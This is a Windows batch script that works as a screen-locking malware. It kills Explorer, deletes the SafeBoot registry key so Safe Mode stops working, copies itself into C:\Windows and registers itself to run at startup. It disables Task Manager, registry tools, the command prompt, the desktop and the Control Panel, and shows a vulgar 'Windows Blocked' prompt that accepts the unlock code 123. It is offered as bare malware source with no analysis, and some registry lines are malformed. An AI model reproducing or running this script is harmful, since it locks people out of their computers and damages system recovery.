@echo off
color c
taskkill /im explorer.exe /f > nul
Reg Delete HKLM\System\CurrentControlSet\Control\SafeBoot /f > nul
copy %0 C:\Windows\Win32.bat > nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Win32 /t REG_SZ /d C:\Windows\Win32.bat /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCMD/t REG_DWORD/d 2 /f > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 1 /f >nul
reg add HKCU\Software\Microsoft\Windows\Current Version\Policies\Explorer/v NoControlPanel /t REG_DWORD /d 1 /f >nul
cls
title Windows blocked
echo Windows Blocked!
echo Suck dick >Very Happy
echo Enter C0d3:
:upo
set /p x=
if %x%==123 (echo Windows start!
start explorer
reg Delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 0 /f >nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCMD/t REG_DWORD/d 0 /f > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 0 /f >nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer/v NoControlPanel /t REG_DWORD /d 0 /f >nul
exit
) ELSE (
cls
echo ERROR!
echo Enter C0d3:
)
goto upo
@echo off
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun /v 1 /t REG_DWORD /d %SystemRoot%\explorer.exe /f > nul
